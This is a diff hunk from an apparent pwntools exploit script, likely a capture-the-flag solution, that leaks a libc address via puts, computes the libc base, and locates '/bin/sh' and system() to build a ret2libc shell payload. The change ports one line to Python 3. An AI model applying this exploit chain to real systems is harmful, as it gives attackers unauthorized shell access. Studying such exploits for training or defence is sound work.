@@ -53,7 +53,7 @@ leak = r.recvline().strip()[-6:].ljust(8, '\0')
 leak = u64(leak)
 libc.address = leak - libc.sym['puts']
 info("%#x", libc.address)
-bin_sh = libc.search('/bin/sh').next()
+bin_sh = next(libc.search('/bin/sh'))
 system = libc.sym['system']
 payload = ''
 payload += flat(
